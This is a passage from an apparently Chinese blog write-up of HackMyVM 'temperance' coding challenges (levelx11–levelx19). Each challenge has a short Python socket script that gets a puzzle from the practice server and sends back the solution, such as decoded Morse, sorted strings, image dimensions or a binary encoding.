    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx11'</span><span class="token punctuation">)</span>


    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>

    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>decode_morse<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx12-字符串加倍"><a href="#levelx12-字符串加倍" class="headerlink" title="levelx12 字符串加倍"></a>levelx12 字符串加倍</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>

<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx12'</span><span class="token punctuation">)</span>


    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>

    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> data3<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx13-字符串排序"><a href="#levelx13-字符串排序" class="headerlink" title="levelx13 字符串排序"></a>levelx13 字符串排序</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">def</span> <span class="token function">last_string</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 移除 "[" 和 "]" 字符</span>
    strings<span class="token operator">=</span>strings<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[]"</span><span class="token punctuation">)</span>
    cleaned_strings <span class="token operator">=</span> <span class="token punctuation">[</span>s <span class="token keyword">for</span> s <span class="token keyword">in</span> strings<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token comment"># 对字符串列表按字母顺序排序</span>
    sorted_strings <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>cleaned_strings<span class="token punctuation">)</span>
    <span class="token comment"># 返回排序后的列表中的最后一个字符串</span>
    <span class="token keyword">return</span> sorted_strings<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>


<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx13'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>

    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>last_string<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx14-统计给定字符出现次数"><a href="#levelx14-统计给定字符出现次数" class="headerlink" title="levelx14 统计给定字符出现次数"></a>levelx14 统计给定字符出现次数</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>


<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx14'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> data3<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    data3<span class="token operator">=</span>data3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx15-等差数列"><a href="#levelx15-等差数列" class="headerlink" title="levelx15 等差数列"></a>levelx15 等差数列</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>


<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx15'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> data3<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx16-base64编码的图像的长宽"><a href="#levelx16-base64编码的图像的长宽" class="headerlink" title="levelx16 base64编码的图像的长宽"></a>levelx16 base64编码的图像的长宽</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO

<span class="token keyword">def</span> <span class="token function">get_image_size</span><span class="token punctuation">(</span>base64_encoded_png<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 将Base64编码的PNG图像解码为二进制数据</span>
    png_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64_encoded_png<span class="token punctuation">)</span>
    
    <span class="token comment"># 使用PIL库打开图像并获取其宽度和高度</span>
    <span class="token keyword">with</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>png_data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> img<span class="token punctuation">:</span>
        width<span class="token punctuation">,</span> height <span class="token operator">=</span> img<span class="token punctuation">.</span>size
    
    <span class="token keyword">return</span> width<span class="token punctuation">,</span> height
HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx16'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>get_image_size<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    width<span class="token punctuation">,</span> height <span class="token operator">=</span> data3
    data3 <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>width<span class="token punctuation">&#125;</span></span><span class="token string">x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>height<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx17-返回base64编码图像的最后一个像素RGBA值"><a href="#levelx17-返回base64编码图像的最后一个像素RGBA值" class="headerlink" title="levelx17 返回base64编码图像的最后一个像素RGBA值"></a>levelx17 返回base64编码图像的最后一个像素RGBA值</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64
<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO

<span class="token keyword">def</span> <span class="token function">get_last_rgba_value</span><span class="token punctuation">(</span>base64_encoded_png<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 将Base64编码的PNG图像解码为二进制数据</span>
    png_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64_encoded_png<span class="token punctuation">)</span>
    
    <span class="token comment"># 使用PIL库打开图像</span>
    <span class="token keyword">with</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>BytesIO<span class="token punctuation">(</span>png_data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> img<span class="token punctuation">:</span>
        <span class="token comment"># 获取图像的像素数据</span>
        pixels <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># 获取图像的宽度和高度</span>
        width<span class="token punctuation">,</span> height <span class="token operator">=</span> img<span class="token punctuation">.</span>size
        <span class="token comment"># 获取最后一个像素的RGBA值</span>
        last_rgba <span class="token operator">=</span> pixels<span class="token punctuation">[</span>width <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> height <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>
    
    <span class="token keyword">return</span> last_rgba
HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>


<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx17'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>get_last_rgba_value<span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data3<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx18-字符串转二进制"><a href="#levelx18-字符串转二进制" class="headerlink" title="levelx18 字符串转二进制"></a>levelx18 字符串转二进制</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket

HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>


<span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving Intro'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b'levelx18'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Receiving challenge.'</span><span class="token punctuation">)</span>
    data2 <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Challenge text:'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data2<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Solved challenge:'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span>data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    data3<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'08b'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> data3<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data3<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    data5<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data5<span class="token punctuation">)</span></code></pre>
<h2 id="levelx19-读取一个base64编码的zip文件提取里面的txt文件"><a href="#levelx19-读取一个base64编码的zip文件提取里面的txt文件" class="headerlink" title="levelx19 读取一个base64编码的zip文件提取里面的txt文件"></a>levelx19 读取一个base64编码的zip文件提取里面的txt文件</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> zipfile
HOST <span class="token operator">=</span> <span class="token string">"temperance.hackmyvm.eu"</span>
PORT <span class="token operator">=</span> <span class="token number">9988</span>
<span class="token keyword">def</span> <span class="token function">extract_text_from_zip</span><span class="token punctuation">(</span>base64_encoded_zip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 解码Base64编码的ZIP文件</span>
    zip_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64_encoded_zip<span class="token punctuation">)</span>
    
    <span class="token comment"># 使用BytesIO创建一个类文件对象</span>
    <span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
    zip_file <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span>zip_data<span class="token punctuation">)</span>
    
    <span class="token comment"># 打开ZIP文件</span>
    <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_ref<span class="token punctuation">:</span>
        <span class="token comment"># 提取ZIP文件中的文本文件名</span>
        txt_file_name <span class="token operator">=</span> zip_ref<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token comment"># 读取文本文件内容</span>
